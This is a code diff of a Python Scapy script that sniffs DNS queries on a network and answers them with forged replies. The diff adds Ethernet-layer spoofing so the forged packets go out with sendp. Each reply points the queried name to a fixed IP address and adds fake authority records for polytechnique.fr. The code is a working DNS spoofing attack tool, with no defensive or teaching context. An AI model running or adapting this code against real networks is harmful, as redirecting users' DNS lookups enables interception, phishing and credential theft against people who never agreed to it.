@@ -16,6 +16,7 @@ def maFonction(a):
     if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
         msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
+        a.show()
         """rrname=a[DNS].qd[0].qname
         id=a[DNS].id
         d = DNS()
@@ -36,7 +37,8 @@ def maFonction(a):
         d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
         d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
         sendp(spoofed, iface_hint=src)"""
-        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst, id=63290)/\
+        spoofed_pkt = Ether(dst=a[Ether].src,src=a[Ether].dst)/\
+                      IP(dst=a[IP].src, src=a[IP].dst, id=63290)/\
                       UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                       DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 0L, qr=1L, ra = 1L, \
                       an = DNSRR(rrname=a[DNS].qd.qname,type='A',rclass='IN', ttl=23942, rdata='129.104.221.35'), \
@@ -55,7 +57,8 @@ def maFonction(a):
                       DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "picaros.polytechnique.fr")/ \
                       DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "milou.polytechnique.fr")/ \
                       DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "ns2.nic.fr"))
-        send(spoofed_pkt)
+        spoofed_pkt.show()
+        sendp(spoofed_pkt)
 
     if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')) and (a[DNS].ancount>0):
         msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
